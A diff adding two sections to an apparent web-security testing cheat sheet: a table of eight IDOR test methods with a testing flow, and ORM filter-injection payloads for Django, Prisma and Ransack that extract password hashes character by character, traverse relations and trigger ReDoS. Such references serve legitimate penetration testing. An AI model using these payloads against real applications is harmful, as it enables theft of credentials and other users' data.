@@ -251,3 +251,86 @@ PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
 □ Compare JSON response field count vs documented fields (hidden fields)
 □ Test state/status field modification
 ```
+
+---
+
+## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES
+
+| # | Category | Test Method |
+|---|---|---|
+| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
+| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
+| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
+| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
+| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
+| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
+| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
+| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |
+
+### Testing Flow
+
+```
+1. Create two test accounts (A and B)
+2. Perform all CRUD operations as A, capture all request IDs
+3. Replay each request replacing A's IDs with B's IDs
+4. Check: Can A read B's data? Modify? Delete?
+5. Test with: numeric IDs, UUIDs, slugs, encoded values
+6. Test across: URL path, query params, JSON body, headers
+```
+
+---
+
+## 14. ORM FILTER CHAIN LEAKS
+
+### Django ORM Filter Injection
+
+```python
+# Vulnerable: User.objects.filter(**request.data)
+# Attacker sends: {"password__startswith": "a"}
+# Django translates to: WHERE password LIKE 'a%'
+
+# Character-by-character extraction:
+POST /api/users/
+{"username": "admin", "password__startswith": "a"}   → 200 (match)
+{"username": "admin", "password__startswith": "b"}   → 404 (no match)
+# Iterate through charset for each position
+
+# Relational traversal:
+{"author__user__password__startswith": "a"}
+# Traverses: Author → User → password field
+
+# On MySQL: ReDoS via regex
+{"email__regex": "^(a+)+$"}  → CPU spike if match exists
+```
+
+### Prisma Filter Injection
+
+```json
+// Vulnerable: prisma.user.findMany({ where: req.body })
+// Attacker sends nested include/select:
+{
+  "include": {
+    "posts": {
+      "include": {
+        "author": {
+          "select": {"password": true}
+        }
+      }
+    }
+  }
+}
+// Leaks password field through relation traversal
+```
+
+### Ransack (Ruby on Rails)
+
+```
+# Ransack allows search predicates via query params:
+GET /users?q[password_cont]=admin
+# Searches: WHERE password LIKE '%admin%'
+
+# Character extraction:
+GET /users?q[password_start]=a   → count results
+GET /users?q[password_start]=ab  → narrow down
+# Tool: plormber (automated Ransack extraction)
+```
